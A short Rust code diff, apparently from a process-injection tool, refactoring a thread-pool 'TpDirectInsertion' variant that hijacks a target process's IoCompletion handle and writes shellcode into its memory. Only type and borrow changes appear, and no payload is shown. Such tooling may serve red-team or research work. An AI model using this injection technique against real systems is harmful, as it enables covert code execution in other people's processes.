@@ -3,14 +3,14 @@ use crate::{
     winapi::{IO_COMPLETION_ALL_ACCESS, NtSetIoCompletion, TpDirect},
 };
 use core::{mem::zeroed, ptr};
-use ghostptr::{AllocationType, MemoryProtection, Process, ProcessError, RemoteProcess};
+use ghostptr::{AllocationType, MemoryProtection, Process, ProcessError};
 
 use super::Variant;
 
 pub struct TpDirectInsertion;
 
 impl Variant for TpDirectInsertion {
-    fn run(&self, process: &RemoteProcess, shellcode: &[u8]) -> ghostptr::Result<()> {
+    fn run(&self, process: &Process, shellcode: &[u8]) -> ghostptr::Result<()> {
         let io_completion_handle =
             hijack_handle(process, "IoCompletion", IO_COMPLETION_ALL_ACCESS)?
                 .expect("failed to hijack IoCompletion handle");
@@ -26,7 +26,7 @@ impl Variant for TpDirectInsertion {
         )?;
 
         // write shellcode
-        process.write_slice(remote_shellcode.address, &shellcode)?;
+        process.write_slice(remote_shellcode.address, shellcode)?;
 
 		println!("remote shellcode: {:#X}", remote_shellcode.address);
 
